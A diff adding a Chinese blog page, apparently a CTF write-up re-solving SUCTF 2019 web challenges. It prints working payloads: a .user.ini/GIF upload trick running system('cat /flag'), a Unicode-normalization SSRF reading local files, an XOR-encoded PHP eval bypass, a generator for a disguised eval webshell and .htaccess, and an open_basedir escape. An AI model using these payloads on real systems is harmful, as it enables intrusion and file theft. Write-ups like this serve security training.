@@ -1,0 +1,474 @@
+<!DOCTYPE html>
+<html>
+  
+<head>
+  <meta charset="utf-8">
+  <meta name="author" content="Imtinmin" />
+  
+  
+  <title>SUCTF2019 复现 | Hexo</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="CTF,WEB,CTF," />
+  
+
+  
+  <meta name="description" content="Imtinmin的小站">
+
+  
+
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.1/dist/av-min.js" async></script>
+  
+
+  
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+  
+
+  
+    <script src="//unpkg.com/valine/dist/Valine.min.js" async></script>
+  
+
+  
+
+  <script>
+  // theme-ad's config script
+  // it can be used in every script
+  
+  window.AD_CONFIG = {
+    leancloud: {"appid":"Hyq9wkH495DgNHWhDQCOfQSp-gzGzoHsz","appkey":"WaR7nrzhliHj9aVwdQzkdlGd","comment":true,"count":true},
+    welcome: {"enable":false,"interval":30},
+    start_time: "2019-10-31",
+    passwords: ["efe07af7441da2b69c4a41e42e73be4db47f66010a56900788a458354a7373ec", ],
+    is_post: true,
+    lock: false,
+    author: "Imtinmin",
+    share: {"twitter":true,"facebook":true,"weibo":true,"qq":true,"wechat":true},
+    mathjax: true,
+    page_type: "",
+    root: "/"
+  };
+</script>
+
+  <script src="/vendor/sha256.min.js"></script>
+<script src="/js/auth.js"></script>
+<script src="/js/index.js"></script>
+<script src="/vendor/qrcode.min.js"></script>
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="//netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+  <link rel="stylesheet" href="/css/index.css">
+<link rel="stylesheet" href="/styles/components/highlight/highlight.css">
+
+  
+</head>
+  <body>
+    <header class="site-header">
+  <div class="site-header-brand">
+    
+      <span class="site-header-brand-title">
+        <a href="/">Imtinmin</a>
+      </span>
+    
+    
+      <span class="site-header-brand-motto"> | 以梦为马</span>
+    
+  </div>
+  <div class="site-header-right">
+    <nav class="site-header-navigation">
+      
+        <a href="/" target="_self">首页</a>
+      
+        <a href="/archives/" target="_self">归档</a>
+      
+        <a href="/tags/" target="_self">标签</a>
+      
+        <a href="/categories/" target="_self">分类</a>
+      
+        <a href="/friends/" target="_self">友链</a>
+      
+        <a href="/about/" target="_self">关于</a>
+      
+    </nav>
+    <div class="site-header-btn">
+      
+        <a href="https://github.com/Imtinmin/" target="_blank" id="site-github">
+          <i class="fa fa-github-alt"></i>
+        </a>
+      
+      <a href="javascript:void(0);" id="site-search">
+        <i class="fa fa-search"></i>
+      </a>
+      <a href="javascript:void(0);" id="site-nav-btn">
+        <i class="fa fa-ellipsis-v"></i>
+      </a>
+    </div>
+  </div>
+</header>
+<nav class="table-content" id="site-nav">
+  <div class="table-content-title">
+    <span>导航</span>
+  </div>
+  <div class="table-content-main">
+    <ol class="toc">
+      
+        <li class="toc-item">
+          <a href="/" target="_self">
+            首页
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/archives/" target="_self">
+            归档
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/tags/" target="_self">
+            标签
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/categories/" target="_self">
+            分类
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/friends/" target="_self">
+            友链
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/about/" target="_self">
+            关于
+          </a>
+        </li>
+      
+    </ol>
+  </div>
+</nav>
+<div id="site-process"></div>
+    <main>
+      
+  <div class="passage">
+  <div class="passage-meta">
+    <span>
+      <i class="fa fa-calendar"></i>2019-08-21
+    </span>
+    
+      <span>
+        | <a href="/categories/CTF/"><i class="fa fa-bookmark"></i>CTF</a>
+      </span>
+    
+    
+      <span>
+        | <i class="fa fa-unlock-alt"></i>UNLOCK
+      </span>
+    
+  </div>
+  <h1 class="passage-title">
+    SUCTF2019 复现
+  </h1>
+  
+    <div class="passage-cover">
+      <figure style="background-image:url(https://i.loli.net/2019/10/31/x1gFWwU6M73toSc.png);"></figure>
+    </div>
+  
+  <article class="passage-article">
+    <p>题目存档<br><a href="https://github.com/team-su/SUCTF-2019" target="_blank" rel="noopener">https://github.com/team-su/SUCTF-2019</a></p>
+<h2 id="checkIn"><a href="#checkIn" class="headerlink" title="checkIn"></a>checkIn</h2><p>上传ini</p>
+<p><code>.user.ini</code></p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="attr">auto_prepend_file</span>=<span class="number">01</span>.gif</span><br></pre></td></tr></table></figure>
+
+<p>上传gif<br><code>01.gif</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a&lt;script language=&quot;php&quot;&gt;system(&apos;cat /flag&apos;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>访问/upload/index.php 自动加载了01.gif,flag到手</p>
+<h2 id="pythonginx"><a href="#pythonginx" class="headerlink" title="pythonginx"></a>pythonginx</h2><p>直接给了源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/getUrl', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">()</span>:</span></span><br><span class="line">    url = request.args.get(<span class="string">"url"</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 111"</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 222 "</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 333"</span></span><br></pre></td></tr></table></figure>
+
+<p>构造：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:////suctf.cc/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>直接是用<code>blackhat</code>议题之一<code>HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization</code></p>
+<p>PPT链接:<a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf" target="_blank" rel="noopener">PPT</a></p>
+<p><img src="https://raw.githubusercontent.com/wiki/imtinmin/photo/SUCTF2019/1.png" alt="img"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse,urlunsplit,urlsplit</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_unicode</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">65536</span>):</span><br><span class="line">        uni=chr(x)</span><br><span class="line">        url=<span class="string">"http://suctf.c&#123;&#125;"</span>.format(uni)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> getUrl(url):</span><br><span class="line">                <span class="comment">#print("str: "+uni+' unicode: \\u'+str(hex(x))[2:])</span></span><br><span class="line">                print((str(<span class="string">'\\u'</span>+str(hex(x))[<span class="number">2</span>:])))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">(url)</span>:</span></span><br><span class="line">    url = url</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    get_unicode()</span><br></pre></td></tr></table></figure>
+
+<p>脚本爆破出符合条件的字符,版本是python3.7的<br><img src="https://raw.githubusercontent.com/wiki/imtinmin/photo/SUCTF2019/2.jpg" alt="img"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>quote(<span class="string">'\u2102'</span>)</span><br><span class="line"><span class="string">'%E2%84%82'</span></span><br></pre></td></tr></table></figure>
+
+<p>读nginx配置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/getUrl?url=file://suctf.c%E2%84%82/usr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">listen 80;</span><br><span class="line">location / &#123;</span><br><span class="line">try_files $uri @app;</span><br><span class="line">&#125;</span><br><span class="line">location @app &#123;</span><br><span class="line">include uwsgi_params;</span><br><span class="line">uwsgi_pass unix:///tmp/uwsgi.sock;</span><br><span class="line">&#125;</span><br><span class="line">location /static &#123;</span><br><span class="line">alias /app/static;</span><br><span class="line">&#125;</span><br><span class="line"># location /flag &#123;</span><br><span class="line"># alias /usr/fffffflag;</span><br><span class="line"># &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>读flag:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/getUrl?url=file://suctf.c%E2%84%AD/usr/fffffflag</span><br></pre></td></tr></table></figure>
+
+<p>还可以去找一下PPT那种字符<code>℆</code>，python3.6,题目环境是3.6，有更多字符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">\u2102</span><br><span class="line">\u2105</span><br><span class="line">\u2106</span><br><span class="line">\u212d</span><br><span class="line">\u216d</span><br><span class="line">\u217d</span><br><span class="line">\u24b8</span><br><span class="line">\u24d2</span><br><span class="line">\uff23</span><br><span class="line">\uff43</span><br></pre></td></tr></table></figure>
+
+<p>构造<code>file://suctf.c℆sr/local/nginx/conf/nginx.conf</code><br>相当于<code>file://suctf.cc/usr/local/nginx/conf/nginx.conf</code></p>
+<p>url编码后</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file://suctf.c%E2%84%86sr/fffffflag</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="EasyPHP"><a href="#EasyPHP" class="headerlink" title="EasyPHP"></a>EasyPHP</h2><p>给了源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">"upload/tmp_"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">	mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">"file"</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">"/ph/i"</span>,$extension)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">'&lt;?'</span>)!==<span class="keyword">False</span>) <span class="keyword">die</span>(<span class="string">"^_^"</span>);</span><br><span class="line">	<span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        $path= $userdir.<span class="string">"/"</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[<span class="string">'_'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'One inch long, one inch strong!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Try something else!'</span>);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">"Almost there!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>参考De1ta wp 复现</p>
+<p><a href="https://blog.zeddyu.info/2019/07/20/isitdtu-2019/" target="_blank" rel="noopener">ISITDTU CTF 2019 EasyPHP 回顾</a></p>
+<p>最后整出这个payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%A0%B8%BA%AB^%ff%ff%ff%ff&#125;&#123;%A0&#125;();&amp;%A0=get_the_flag</span><br></pre></td></tr></table></figure>
+
+<p>感谢七友师傅先知下回复我</p>
+<p><a href="https://thibaudrobin.github.io/articles/bypass-filter-upload/" target="_blank" rel="noopener">https://thibaudrobin.github.io/articles/bypass-filter-upload/</a><br>生成上传文件,生成<code>xbm</code>图片类型绕过检测</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">SIZE_HEADER = <span class="string">b"\n\n#define width 1337\n#define height 1337\n\n"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_php_file</span><span class="params">(filename, script)</span>:</span></span><br><span class="line">    phpfile = open(filename, <span class="string">'wb'</span>)</span><br><span class="line"></span><br><span class="line">    phpfile.write(script.encode(<span class="string">'utf-16be'</span>))</span><br><span class="line">    phpfile.write(SIZE_HEADER)</span><br><span class="line"></span><br><span class="line">    phpfile.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_htacess</span><span class="params">()</span>:</span></span><br><span class="line">    htaccess = open(<span class="string">'.htaccess'</span>, <span class="string">'wb'</span>)</span><br><span class="line"></span><br><span class="line">    htaccess.write(SIZE_HEADER)</span><br><span class="line">    htaccess.write(<span class="string">b'AddType application/x-httpd-php .south\n'</span>)</span><br><span class="line">    htaccess.write(<span class="string">b'php_value zend.multibyte 1\n'</span>)</span><br><span class="line">    htaccess.write(<span class="string">b'php_value zend.detect_unicode 1\n'</span>)</span><br><span class="line">    htaccess.write(<span class="string">b'php_value display_errors 1\n'</span>)</span><br><span class="line"></span><br><span class="line">    htaccess.close()</span><br><span class="line"></span><br><span class="line">generate_htacess()</span><br><span class="line">generate_php_file(<span class="string">"webshell.south"</span>, <span class="string">"&lt;?php eval($_GET['cmd']); die(); ?&gt;"</span>)</span><br></pre></td></tr></table></figure>
+
+
+<p><code>phpinfo</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open_basedir	/var/www/html/:/tmp/</span><br></pre></td></tr></table></figure>
+
+<p>只能读到网站根目录<br><code>/var/wwww/html/F1AghhhhhhhhhhhhhHH</code></p>
+<p>假flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hhhh This is fake flag But I heard php7.2-fpm has been initialized in unix socket mode! ~</span><br></pre></td></tr></table></figure>
+
+<p>0CTF-TCTF final的绕过open_basedir任意文件读取</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=mkdir(&quot;/tmp/fuck&quot;);chdir(&apos;/tmp/fuck/&apos;);ini_set(&apos;open_basedir&apos;,&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);ini_set(&apos;open_basedir&apos;,&apos;/&apos;);readfile(&apos;/THis_Is_tHe_F14g&apos;);</span><br></pre></td></tr></table></figure>
+
+<p>result:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;b&gt;Warning&lt;/b&gt;: mkdir(): File exists in</span><br><span class="line">&lt;b&gt;/var/www/html/upload/tmp_4ec272d6ec1a837b54c3a413eb2c14f1/webshell.south(1) : eval()&apos;d code&lt;/b&gt; on line &lt;b&gt;1&lt;/b&gt;&lt;br /&gt;</span><br><span class="line">suctf&#123;Undefined_constant_With_XOR_Code_Execution&#125;</span><br></pre></td></tr></table></figure>
+
+<p>还可以用这个方法绕 生成wbmp图片文件解析为php<a href="https://xz.aliyun.com/t/3937" target="_blank" rel="noopener">https://xz.aliyun.com/t/3937</a></p>
+<p>图片文件格式:<a href="https://www.php.net/manual/en/function.exif-imagetype.php#refsect1-function.exif-imagetype-constants" target="_blank" rel="noopener">https://www.php.net/manual/en/function.exif-imagetype.php#refsect1-function.exif-imagetype-constants</a></p>
+<p>ps:<a href="https://xz.aliyun.com/t/6281?accounttraceid=31d42a05-72e9-480d-9fe8-3ef6c20ab713#toc-0" target="_blank" rel="noopener">另一种解法</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:////suctf.cc/../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+<h2 id="Upload-Labs-2"><a href="#Upload-Labs-2" class="headerlink" title="Upload Labs 2"></a>Upload Labs 2</h2><p>思路是ssrf 成为管理员访问<code>admin.php</code>，new 一个<code>Ad</code>类</p>
+<p>用到<code>rogue mysql</code>的触发反序列化</p>
+<p>zsx大佬!<br><img src="https://raw.githubusercontent.com/wiki/imtinmin/photo/SUCTF2019/3.jpg" alt="img"></p>
+<p>设置<br><code>php.ini</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqli.allow_local_infile = On</span><br></pre></td></tr></table></figure>
+
+<p><code>my.cnf (my.ini)</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">local-infile=1</span><br><span class="line">secure_file_priv=&quot;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>走你<br><img src="https://raw.githubusercontent.com/wiki/imtinmin/photo/SUCTF2019/4.png" alt="img"></p>
+<p>不知道为啥没复现成功，先放着……</p>
+
+  </article>
+  <aside class="table-content" id="site-toc">
+  <div class="table-content-title">
+    <i class="fa fa-arrow-right fa-lg" id="site-toc-hide-btn"></i>
+    <span>目录</span>
+  </div>
+  <div class="table-content-main">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#checkIn"><span class="toc-text">checkIn</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pythonginx"><span class="toc-text">pythonginx</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EasyPHP"><span class="toc-text">EasyPHP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Upload-Labs-2"><span class="toc-text">Upload Labs 2</span></a></li></ol>
+  </div>
+</aside>
+  
+  
+    <div class="passage-tags">
+     
+      <a href="/tags/WEB/"><i class="fa fa-tags"></i>WEB</a>
+     
+      <a href="/tags/CTF/"><i class="fa fa-tags"></i>CTF</a>
+    
+    </div>
+  
+</div>
+
+    </main>
+    
+      
+<div class="site-comment-contanier" data-plateform="leancloud">
+  
+    <p id="site-comment-info">
+      <i class="fa fa-spinner fa-spin"></i> 评论加载中
+    </p>
+    <div id="site-comment"></div>
+  
+</div>
+    
+    <div class="site-footer-wrapper">
+  <footer class="site-footer">
+    
+      
+        <div class="site-footer-col">
+          <h5 class="site-footer-title">博客推荐</h5>
+          
+            <span class="site-footer-item">
+              <a href="https://godbmw.com/" target="_blank">GodBMW</a>
+            </span>
+          
+            <span class="site-footer-item">
+              <a href="http://ruanyifeng.com/" target="_blank">阮一峰的个人网站</a>
+            </span>
+          
+        </div>
+      
+        <div class="site-footer-col">
+          <h5 class="site-footer-title">系列教程</h5>
+          
+            <span class="site-footer-item">
+              <a href="https://godbmw.com/categories/webpack4%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B/" target="_blank">webpack4系列教程</a>
+            </span>
+          
+            <span class="site-footer-item">
+              <a href="https://godbmw.com/design-patterns/" target="_blank">设计模式手册</a>
+            </span>
+          
+        </div>
+      
+        <div class="site-footer-col">
+          <h5 class="site-footer-title">抓到我</h5>
+          
+            <span class="site-footer-item">
+              <a href="https://juejin.im/user/5b91fcf06fb9a05d3c7fd4a5" target="_blank">掘金</a>
+            </span>
+          
+            <span class="site-footer-item">
+              <a href="https://segmentfault.com/" target="_blank">思否</a>
+            </span>
+          
+        </div>
+      
+    
+    <div class="site-footer-info">
+      <i class="fa fa-clock-o"></i> 本站已稳定运行<span id="site-time"></span>
+    </div>
+    
+      <div class="site-footer-info">
+        <i class="fa fa-paw"></i> 您是本站第 <span id="site-count"></span> 位访客
+      </div>
+    
+    
+      <div class="site-footer-info">
+        <i class="fa fa-at"></i> Email: yuanxin.me@gmail.com
+      </div>
+    
+    <div class="site-footer-info">
+      <i class="fa fa-copyright"></i> 
+      2019 <a href="https://github.com/dongyuanxin/theme-ad/" target="_blank">Theme-AD</a>.
+      Created by <a href="https://godbmw.com/" target="_blank">GodBMW</a>.
+      All rights reserved.
+    </div>
+  </footer>
+</div>
+    <div id="site-layer" style="display:none;">
+  <div class="site-layer-content">
+    <div class="site-layer-header">
+      <span class="site-layer-header-title" id="site-layer-title"></span>
+      <i class="fa fa-close" id="site-layer-close"></i>
+    </div>
+    <div class="site-layer-body" id="site-layer-container">
+      <div class="site-layer-input" id="site-layer-search" style="display: none;">
+        <div class="site-layer-input-choose">
+          <a href="javascript:void(0);" title="Change Search Engine">Google</a>
+        </div>
+        <input type="text">
+        <i class="fa fa-search"></i>
+      </div>
+      
+        <div class="site-layer-reward" id="site-layer-reward" style="display: none;">
+          
+            <div>
+              <img src="/images/wechat.png" alt="WeChat">
+              
+                <p>WeChat</p>
+              
+            </div>
+          
+            <div>
+              <img src="/images/alipay.png" alt="AliPay">
+              
+                <p>AliPay</p>
+              
+            </div>
+          
+        </div>
+      
+      <div id="site-layer-welcome" style="display:none;"></div>
+    </div>
+  </div>
+</div>
+    
+
+<div class="bottom-bar">
+  <div class="bottom-bar-left">
+    <a href="javascript:void(0);" data-enable="false">
+      <i class="fa fa-arrow-left"></i>
+    </a>
+    <a href="/2019/08/08/2019-8-8-CTF/" data-enable="true">
+      <i class="fa fa-arrow-right"></i>
+    </a>
+  </div>
+  <div class="bottom-bar-right">
+    <a href="javascript:void(0);" data-enable="true" id="site-toc-show-btn">
+      <i class="fa fa-bars"></i>
+    </a>
+    
+      <a href="#site-comment" data-enable="true">
+        <i class="fa fa-commenting"></i>
+      </a>
+    
+    <a href="javascript:void(0);" id="site-toggle-share-btn">
